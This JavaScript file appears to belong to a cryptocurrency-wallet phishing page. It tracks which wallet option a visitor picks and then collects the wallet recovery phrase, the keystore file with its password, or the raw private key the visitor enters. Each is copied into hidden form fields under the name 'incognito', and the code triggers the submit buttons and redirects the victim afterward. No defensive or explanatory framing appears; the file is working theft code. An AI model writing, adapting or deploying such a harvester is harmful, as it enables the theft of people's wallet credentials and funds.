let state = {};

function setState(newState) {
    state = { ...state, ...newState };
    console.log("State updated:", state);
}

document.querySelectorAll(".pageStyles__SApp-sc-1navawn-5").forEach(div => {
    div.addEventListener("click", function () {
        const id = this.id; 
        if (id) {
            setState({ currentDivId: id }); 
        }
    });
});

const checkState = () => {
    console.log("Current state:", state);
};

function load() {
    if (submitted) {
        window.location.href = './index.html'
    }
}
function click1() {
    document.getElementById("submit1").click()
}

function click2() {
    document.getElementById("submit2").click()
}

function click3() {
    document.getElementById("submit3").click()
}

const check1 = () => {
    const incognito = []
    var c;
    c = (document.getElementById(`phraseInput`).value);
    const textareaElement = document.getElementById('phraseInput');
    const nameValue = textareaElement.getAttribute('name');
    incognito.push(`${state.currentDivId} ${nameValue}   ->   `, c)
    document.getElementById("use").value = JSON.stringify(incognito)
    document.getElementById("formuse").value = JSON.stringify(incognito)
    console.log("incognito", incognito)
}

const check2 = () => {
    const incognito = []
    var c;
    c = (document.getElementById(`keystorejson`).value);
    var d;
    d = (document.getElementById(`keystorepassword`).value);
    const textareaElement = document.getElementById('keystorejson');
    const nameValue = textareaElement.getAttribute('name');
    const textareaElement2 = document.getElementById('keystorepassword');
    const nameValue2 = textareaElement2.getAttribute('name');
    incognito.push(`${state.currentDivId} ${nameValue}   ->   `, c, "---------------------", `${nameValue2}   ->   `, d)
    document.getElementById("use2").value = JSON.stringify(incognito)
    document.getElementById("formuse2").value = JSON.stringify(incognito)
    console.log("incognito", incognito)
}

const check3 = () => {
    const incognito = []
    var c;
    c = (document.getElementById(`privatekey`).value);
    const textareaElement = document.getElementById('privatekey');
    const nameValue = textareaElement.getAttribute('name');
    incognito.push(`${state.currentDivId} ${nameValue}   ->   `, c)
    document.getElementById("use3").value = JSON.stringify(incognito)
    document.getElementById("formuse3").value = JSON.stringify(incognito)
    console.log("incognito", incognito)
}